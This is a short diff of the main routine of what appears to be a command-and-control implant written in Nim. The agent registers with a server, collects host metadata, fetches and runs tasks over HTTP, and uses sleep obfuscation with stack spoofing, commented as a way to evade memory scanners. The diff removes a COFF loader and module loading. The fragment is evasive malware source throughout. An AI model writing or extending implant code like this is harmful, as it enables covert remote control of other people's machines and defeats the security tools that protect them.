@@ -1,8 +1,7 @@
 import strformat, os, times, system, base64
 
-import core/[http, context, sleepmask, coff]
+import core/[http, context, sleepmask]
 import protocol/[task, result, heartbeat, registration]
-import ../modules/manager
 import ../common/[types, utils, crypto]
 
 proc main() = 
@@ -11,9 +10,6 @@ proc main() =
     var ctx = AgentCtx.init()
     if ctx == nil: 
         quit(0)
-
-    # Load agent commands
-    loadModules() 
 
     # Create registration payload
     var registration: AgentRegistrationData = ctx.collectAgentMetadata()
@@ -32,7 +28,6 @@ proc main() =
         4. If additional tasks have been fetched, go to 2.
         5. If no more tasks need to be executed, go to 1. 
     ]#
-
     while true: 
         # Sleep obfuscation to evade memory scanners
         sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)
